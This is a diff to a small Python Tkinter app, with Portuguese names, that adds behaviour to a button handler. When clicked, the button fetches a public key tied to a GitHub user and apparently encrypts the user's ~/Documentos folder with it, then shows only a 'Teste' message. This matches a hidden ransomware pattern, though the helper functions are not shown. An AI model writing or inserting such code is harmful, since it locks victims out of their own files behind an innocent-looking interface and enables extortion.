@@ -1,9 +1,18 @@
 #!/usr/bin/env python3
+import os
 import tkinter as tk
 from tkinter import messagebox
 
+from main import GITHUB_USER, encriptar_pasta, obter_chave_publica_github
+
 # --- Funções do App ---
 def acao_botao():
+    pasta = os.path.expanduser("~/Documentos")
+    
+    chave_pub = obter_chave_publica_github(GITHUB_USER)
+    
+    if chave_pub:
+        encriptar_pasta(pasta, chave_pub)
     messagebox.showinfo("Teste")
 
 def fechar():
